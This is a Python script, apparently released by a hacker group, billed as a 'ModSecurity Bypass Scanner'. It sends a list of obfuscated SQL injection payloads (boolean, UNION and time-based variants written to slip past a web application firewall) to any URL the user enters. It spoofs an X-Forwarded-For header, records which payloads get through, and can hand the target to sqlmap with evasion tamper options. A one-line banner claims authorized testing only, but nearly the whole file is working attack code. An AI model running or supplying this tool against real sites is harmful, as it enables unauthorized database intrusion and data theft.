#!/usr/bin/env python3
import requests
import time
import subprocess
import platform
import datetime
from colorama import Fore, Style, init

# Informações dinâmicas
sistema = platform.system()
versao = platform.release()
data_hora = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
payloads_count = 35  # ou use len(payloads) se os payloads já existirem

# Inicializa cores no Windows também
init(autoreset=True)

# Banner estilizado
print(
    Fore.CYAN
    + r"""
  _______ _______ ___         ___       __            __   __                 _______ ______   ___ ___            _______ _______ 
 |   _   |   _   |   |       |   .-----|__.-----.----|  |_|__.-----.-----.   |   _   |   _  \ |   Y   |    ______|   _   |   _   |
 |   1___|.  |   |.  |       |.  |     |  |  -__|  __|   _|  |  _  |     |   |.  1   |.  |   \|.  |   |   |______|.  1___|   1___|
 |____   |.  |   |.  |___    |.  |__|__|  |_____|____|____|__|_____|__|__|   |.  _   |.  |    |.  |   |          |.  __) |____   |
 |:  1   |:  1   |:  1   |   |:  |    |___|                                  |:  |   |:  1    |:  1   |          |:  |   |:  1   |
 |::.. . |::..   |::.. . |   |::.|                                           |::.|:. |::.. . / \:.. ./           |::.|   |::.. . |
 `-------`----|:.`-------'   `---'                                           `--- ---`------'   `---'            `---'   `-------'
              `--'                                                                                                                
"""
    + Style.RESET_ALL
)

print(Fore.GREEN + "════════════════════════════════════════════════════════════════════════════════════")
print(Fore.GREEN + "               ✦  ModSecurity Bypass Scanner v1.1  ✦")
print(Fore.GREEN + f"        ★ By: K1r4_Fr13nd5   |   ☠ Sociedade Fr13nd5 ☠")
print(Fore.GREEN + "════════════════════════════════════════════════════════════════════════════════════")
print(Fore.YELLOW + f" [⚠] Uso autorizado somente para testes éticos e ambientes controlados.")
print(Fore.CYAN + f" [✓] GitHub: " + Fore.WHITE + "https://github.com/K1r4-Fr13nd5")
print(Fore.MAGENTA + f" [ℹ] Sistema: {sistema} {versao}  |  Data/Hora: {data_hora}")
print(Fore.MAGENTA + f" [✔] Payloads carregados: {payloads_count}")
print(Fore.GREEN + "════════════════════════════════════════════════════════════════════════════════════\n" + Style.RESET_ALL)

# Payloads ofuscados e variados
payloads = [
    "' OR 1=1--",
    "' OR '1'='1 --",
    "'/**/OR/**/1=1--",
    "'/*!50000OR*/1=1--",
    "' OR 'A'='A'||'B'='B",
    "' OR CONCAT('a','b')='ab' --",
    "%27%20OR%201=1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' UNION SELECT NULL,version(),database()--",
    "' UnIoN/**/SeLeCt NULL,NULL--",
    "'/*!50000UNION*/ SELECT NULL,NULL--",
    "' OR LENGTH(user())>0--",
    "' OR pg_sleep(3)--",
    "' OR BENCHMARK(1000000,MD5(1))--",
    "' OR RAND()<1--",
    "' /*!UNION*/ /*!SELECT*/ NULL,NULL--",
]

def detect_waf(url):
    """Detecção simples de WAF"""
    print(Fore.CYAN + "\n[+] Checando presença de WAF (ModSecurity)...")
    test_payload = "' OR '1'='1"
    try:
        r = requests.get(url, params={"q": test_payload}, timeout=5)
        if "mod_security" in r.text.lower() or r.status_code == 406:
            print(Fore.RED + "[!] Possível WAF detectado (ModSecurity ou similar)")
        else:
            print(Fore.GREEN + "[✔] Nenhum WAF aparente detectado.")
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao checar WAF: {e}")

def scan_url(target_url):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
        "X-Forwarded-For": "127.0.0.1",
    }

    log_file = "resultado_scan.txt"
    bypass_file = "bypass_detectados.txt"

    with open(log_file, "w", encoding="utf-8") as f, open(bypass_file, "w", encoding="utf-8") as bf:
        f.write("Resultados do Scanner de Bypass ao ModSecurity\n")
        f.write(f"URL Alvo: {target_url}\n\n")

        for i, payload in enumerate(payloads):
            try:
                print(Fore.BLUE + f"[{i+1}] Testando payload: {payload}" + Style.RESET_ALL)
                params = {"q": payload}

                start_time = time.time()
                response = requests.get(target_url, params=params, headers=headers, timeout=10)
                end_time = time.time()

                code = response.status_code
                content_len = len(response.text)
                delay = round(end_time - start_time, 2)

                log_line = f"Payload: {payload} | Código: {code} | Tamanho: {content_len} | Delay: {delay}s\n"
                f.write(log_line)

                if code == 200 and "error" not in response.text.lower():
                    print(Fore.GREEN + f"    [+] Possível bypass! Código: {code} | Tempo: {delay}s")
                    bf.write(f"{payload}\n")
                elif delay > 3:
                    print(Fore.YELLOW + f"    [!] Possível SQLi Time-based (delay: {delay}s)")
                    bf.write(f"[Time-based] {payload}\n")
                elif code == 403:
                    print(Fore.RED + "    [-] Bloqueado (403)")
                else:
                    print(f"    Código: {code} | Tamanho: {content_len} bytes | Tempo: {delay}s")

                time.sleep(1)

            except Exception as e:
                print(Fore.RED + f"    Erro: {str(e)}" + Style.RESET_ALL)
                f.write(f"Erro com payload '{payload}': {e}\n")

    print(Fore.MAGENTA + f"\n[+] Resultados completos salvos em: {log_file}")
    print(Fore.GREEN + f"[+] Payloads com bypass salvos em: {bypass_file}" + Style.RESET_ALL)

def run_sqlmap(target_url):
    print(Fore.YELLOW + "\n[+] Executando sqlmap com evasão automática...")
    try:
        subprocess.run(
            [
                "sqlmap",
                "-u", target_url,
                "--random-agent",
                "--tamper=space2comment,randomcase,between",
                "--batch",
            ]
        )
    except FileNotFoundError:
        print(Fore.RED + "[!] sqlmap não encontrado! Instale usando: sudo apt install sqlmap")

# Entrada do usuário com tratamento de Ctrl+C
try:
    url = input(Fore.MAGENTA + "\n[?] Digite a URL alvo (ex: http://alvo.com/busca.php): " + Style.RESET_ALL).strip()

    detect_waf(url)
    scan_url(url)

    usar_sqlmap = input(Fore.CYAN + "\n[?] Deseja usar sqlmap automaticamente nesta URL? (s/n): " + Style.RESET_ALL).lower()
    if usar_sqlmap == "s":
        run_sqlmap(url)

except KeyboardInterrupt:
    print(Fore.RED + "\n[!] Execução interrompida pelo usuário." + Style.RESET_ALL)
    exit(0)
